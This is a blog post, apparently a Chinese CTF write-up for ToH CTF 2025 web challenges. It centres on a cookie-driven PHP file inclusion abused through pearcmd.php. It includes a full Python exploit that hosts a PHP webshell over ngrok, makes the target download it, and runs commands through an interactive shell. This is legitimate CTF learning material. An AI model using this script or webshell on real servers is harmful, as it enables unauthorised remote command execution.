{"title":"ToH-CTF-2025-wp","uid":"c975b3dba699846d3028e54167fa3267","slug":"ToH-CTF-2025-wp","date":"2025-07-22T10:57:01.000Z","updated":"2025-07-22T11:17:16.837Z","comments":true,"path":"api/articles/ToH-CTF-2025-wp.json","keywords":null,"cover":"/image/7.jpg","content":"<h2 id=\"web-tohwedding\"><a href=\"#web-tohwedding\" class=\"headerlink\" title=\"web-tohwedding\"></a>web-tohwedding</h2><p>看源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">session_start</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;lang&#x27;</span>])) &#123;</span><br><span class=\"line\">  <span class=\"variable\">$lang</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;lang&#x27;</span>];</span><br><span class=\"line\">  <span class=\"comment\">// we don&#x27;t trust the GET parameter, comes from the user</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable\">$lang</span> != <span class=\"string\">&#x27;en&#x27;</span> &amp;&amp; <span class=\"variable\">$lang</span> != <span class=\"string\">&#x27;it&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// default if lang is not valid, is italian</span></span><br><span class=\"line\">    <span class=\"variable\">$lang</span> = <span class=\"string\">&#x27;it&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// Register the session and set the cookie</span></span><br><span class=\"line\">  <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;lang&#x27;</span>] = <span class=\"variable\">$lang</span>;</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">setcookie</span>(<span class=\"string\">&#x27;lang&#x27;</span>, <span class=\"variable\">$lang</span>, <span class=\"title function_ invoke__\">time</span>() + (<span class=\"number\">3600</span> * <span class=\"number\">24</span> * <span class=\"number\">30</span>));</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;lang&#x27;</span>])) &#123;</span><br><span class=\"line\">  <span class=\"variable\">$lang</span> = <span class=\"variable\">$_SESSION</span>[<span class=\"string\">&#x27;lang&#x27;</span>];</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;lang&#x27;</span>])) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// cookie is safe, we set it ourself</span></span><br><span class=\"line\">  <span class=\"variable\">$lang</span> = <span class=\"variable\">$_COOKIE</span>[<span class=\"string\">&#x27;lang&#x27;</span>];</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">  <span class=\"comment\">// default language is browser language</span></span><br><span class=\"line\">  <span class=\"variable\">$lang</span> = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;HTTP_ACCEPT_LANGUAGE&#x27;</span>], <span class=\"number\">0</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable\">$lang</span> != <span class=\"string\">&#x27;en&#x27;</span> &amp;&amp; <span class=\"variable\">$lang</span> != <span class=\"string\">&#x27;it&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// default if browser is not valid, is italian</span></span><br><span class=\"line\">    <span class=\"variable\">$lang</span> = <span class=\"string\">&#x27;it&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// include the language file</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;lang/&#x27;</span> . <span class=\"variable\">$lang</span> . <span class=\"string\">&#x27;.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>大致看来我们可以控制cookie进行文件包含。PHP 默认带有 <code>pearcmd.php</code> 文件，它是 PEAR 包管理器的命令行界面。此文件通常位于 <code>/usr/local/lib/php/</code> 目录中，但会因系统而异。如果我们能够执行它并传递给它参数，它就可以用来执行任意命令。</p>\n<p>当我们给pearcmd.php传参数的时候，这些参数将被传递给 <code>$_SERVER[&#39;argv&#39;]</code> 变量。</p>\n<p>我们就可以通过包含pearcmd.php文件，并将我们想要执行的命令作为参数传递给它来执行任意命令</p>\n<p>具体利用<a href=\"https://blog.csdn.net/Mrs_H/article/details/122386511\">https://blog.csdn.net/Mrs_H/article/details/122386511</a></p>\n<p>将 <code>lang</code> cookie 设置为 <code>../../../../usr/local/lib/php/pearcmd</code>，将包含pearcmd.php到当前页面，用查询参数<code>/?&amp;+install+-R+/+&#123;webhook_url&#125;/s.php</code> 注入 <code>$_SERVER[&#39;argv&#39;]</code> 变量。将执行pearcmd.php,它将从 webhook URL 下载 <code>s.php</code> 文件,默认保存在<code>/tmp/pear/download/</code> 目录中。</p>\n<p>再次包含时要设置为..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;pear&#x2F;download&#x2F;s</p>\n<p>我们需要控制s.php内容，写一个webshell从而任意命令执行</p>\n<p>上帝视角我们进行cat rsvp_*，直接读取rsvp_X.csv文件中的flag</p>\n<p>利用脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pyngrok.ngrok</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyngrok <span class=\"keyword\">import</span> ngrok</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, Response</span><br><span class=\"line\"><span class=\"keyword\">from</span> threading <span class=\"keyword\">import</span> Thread</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">random_hex</span>(<span class=\"params\">length=<span class=\"number\">8</span></span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Generate a random hexadecimal string of specified length.&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>.join(random.choice(<span class=\"string\">&#x27;0123456789abcdef&#x27;</span>) <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(length))</span><br><span class=\"line\"></span><br><span class=\"line\">rndhex = random_hex()</span><br><span class=\"line\"></span><br><span class=\"line\">app_path = <span class=\"string\">f&quot;/s<span class=\"subst\">&#123;rndhex&#125;</span>.php&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(<span class=\"params\">app_path</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">revshell</span>():</span><br><span class=\"line\">  php_code = <span class=\"string\">&quot;&quot;&quot;&lt;?php</span></span><br><span class=\"line\"><span class=\"string\">  if (isset($_GET[&#x27;cmd&#x27;])) &#123;</span></span><br><span class=\"line\"><span class=\"string\">      $cmd = $_GET[&#x27;cmd&#x27;];</span></span><br><span class=\"line\"><span class=\"string\">      echo &quot;&lt;pre&gt;&quot; . shell_exec($cmd) . &quot;&lt;/pre&gt;&quot;;</span></span><br><span class=\"line\"><span class=\"string\">  &#125; else &#123;</span></span><br><span class=\"line\"><span class=\"string\">      echo &quot;No command provided.&quot;;</span></span><br><span class=\"line\"><span class=\"string\">  &#125;</span></span><br><span class=\"line\"><span class=\"string\">?&gt;&quot;&quot;&quot;</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> Response(php_code, mimetype=<span class=\"string\">&#x27;application/x-httpd-php&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s = requests.Session()</span><br><span class=\"line\">flag_format = <span class=\"string\">&quot;toh&#123;[^&#125;]+&#125;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># host a s.php file in repourl</span></span><br><span class=\"line\">ngrok_tunnel = ngrok.connect(<span class=\"number\">5000</span>)</span><br><span class=\"line\">webhook_url = ngrok_tunnel.public_url</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># challenge url</span></span><br><span class=\"line\">baseurl = <span class=\"string\">&quot;http://192.168.1.191:8080/&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#baseurl = &quot;https://tohwedding.ctf.towerofhanoi.it&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">lfi2download</span>():</span><br><span class=\"line\">  url = <span class=\"string\">f&quot;<span class=\"subst\">&#123;baseurl&#125;</span>/?&amp;+install+-R+/+<span class=\"subst\">&#123;webhook_url&#125;</span>/s<span class=\"subst\">&#123;rndhex&#125;</span>.php&quot;</span></span><br><span class=\"line\">  s.cookies.<span class=\"built_in\">set</span>(<span class=\"string\">&quot;lang&quot;</span>, <span class=\"string\">&quot;../../../../usr/local/lib/php/pearcmd&quot;</span>)</span><br><span class=\"line\">  r = s.get(url)</span><br><span class=\"line\">  <span class=\"built_in\">print</span>(r.text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">trigger_rce</span>(<span class=\"params\">cmd</span>):</span><br><span class=\"line\">  url = <span class=\"string\">f&quot;<span class=\"subst\">&#123;baseurl&#125;</span>/?cmd=<span class=\"subst\">&#123;urllib.parse.quote(cmd)&#125;</span>&quot;</span></span><br><span class=\"line\">  s.cookies.<span class=\"built_in\">set</span>(<span class=\"string\">&quot;lang&quot;</span>, <span class=\"string\">f&quot;../../../../tmp/pear/download/s<span class=\"subst\">&#123;rndhex&#125;</span>&quot;</span>)</span><br><span class=\"line\">  r = s.get(url)</span><br><span class=\"line\">  text = r.text.split(<span class=\"string\">&quot;&lt;!DOCTYPE&quot;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">  <span class=\"built_in\">print</span>(text)</span><br><span class=\"line\">  <span class=\"keyword\">return</span> text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">interactive_shell</span>():</span><br><span class=\"line\">  <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    cmd = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;$&gt; &quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> cmd.lower() == <span class=\"string\">&quot;exit&quot;</span>:</span><br><span class=\"line\">      <span class=\"keyword\">break</span></span><br><span class=\"line\">    trigger_rce(cmd)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_flag</span>():</span><br><span class=\"line\">  text = trigger_rce(<span class=\"string\">&quot;cat rsvp_*&quot;</span>)</span><br><span class=\"line\">  <span class=\"built_in\">print</span>(text)</span><br><span class=\"line\">  flag = re.search(flag_format, text)</span><br><span class=\"line\">  <span class=\"keyword\">if</span> flag:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(flag.group(<span class=\"number\">0</span>))</span><br><span class=\"line\">  <span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[!] No flag found.&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">  lfi2download()</span><br><span class=\"line\">  get_flag()</span><br><span class=\"line\">  interactive_shell()</span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">  Thread(target=app.run, kwargs=&#123;<span class=\"string\">&#x27;host&#x27;</span>: <span class=\"string\">&#x27;0.0.0.0&#x27;</span>, <span class=\"string\">&#x27;port&#x27;</span>: <span class=\"number\">5000</span>&#125;, daemon=<span class=\"literal\">True</span>).start()</span><br><span class=\"line\">  main()</span><br></pre></td></tr></table></figure>\n\n<p>准备工作：配置authtoken，准备</p>\n<p>先搭建了一个恶意web服务，写了webshell</p>\n<p>lfi2download()：将恶意php上传到目标<a href=\"http://192.168.1.191:8080/%EF%BC%8C%E8%87%AA%E5%B7%B1%E8%B5%B7%E7%9A%84docker\">http://192.168.1.191:8080/，自己起的docker</a></p>\n<p>get_flag()：执行cat rsvp_*命令读取到flag</p>\n<p>interactive_shell()：进入到命令交互式终端，方便进行后续操作。如果没有上帝视角就需要进入命令交互式终端进行rce</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250722191200981.png\" alt=\"image-20250722145944345\"></p>\n<p>得到flag</p>\n<h2 id=\"web-zerodrive\"><a href=\"#web-zerodrive\" class=\"headerlink\" title=\"web-zerodrive\"></a>web-zerodrive</h2><ol>\n<li>&#x2F;upload : 允许上传 0B 文件，但仅限于 <code>uploads</code> 文件夹内</li>\n<li>&#x2F;uploads&#x2F;uuid : 允许下载上传的文件</li>\n<li>&#x2F;rename&#x2F;uuid : 允许重命名文件</li>\n</ol>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250722191515483.png\"></p>\n<p>查询修改后的新路径更新数据库，如果存在..&#x2F;或&#x2F;返回400</p>\n<p>我们修改恶意文件，然后根据uuid可以查询文件内容</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250722191437565.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/riskcow/picture-bed@main/img/20250722191457928.png\"></p>\n<p>这个文件直接访问数据库出问题了没成功，又上传了一次文件，这次成功了</p>\n","feature":true,"text":"web-tohwedding看源码 123456789101112131415161718192021222324252627282930<?phpsessio...","permalink":"/post/ToH-CTF-2025-wp","photos":[],"count_time":{"symbolsCount":"4.7k","symbolsTime":"4 mins."},"categories":[{"name":"web","slug":"web","count":5,"path":"api/categories/web.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web-tohwedding\"><span class=\"toc-text\">web-tohwedding</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#web-zerodrive\"><span class=\"toc-text\">web-zerodrive</span></a></li></ol>","author":{"name":"Riskcow","slug":"blog-author","avatar":"/image/1.jpg","link":"/","description":"断绝容易，难的是停止思念不再回头。","socials":{"github":"https://github.com/Riskcow","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{},"next_post":{"title":"L3HCTF-WEB","uid":"3afc90457b92b90702a717b9d89559ea","slug":"L3HCTF-WEB","date":"2025-07-18T10:03:39.000Z","updated":"2025-07-18T10:23:31.352Z","comments":true,"path":"api/articles/L3HCTF-WEB.json","keywords":null,"cover":"/image/3.webp","text":"best_profile 观察源码，找到利用点，ssti 要先进入/ip_detail/string:username路由 但是/ip_detail/strin...","permalink":"/post/L3HCTF-WEB","photos":[],"count_time":{"symbolsCount":"5.2k","symbolsTime":"5 mins."},"categories":[{"name":"web","slug":"web","count":5,"path":"api/categories/web.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}],"author":{"name":"Riskcow","slug":"blog-author","avatar":"/image/1.jpg","link":"/","description":"断绝容易，难的是停止思念不再回头。","socials":{"github":"https://github.com/Riskcow","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"feature":true}}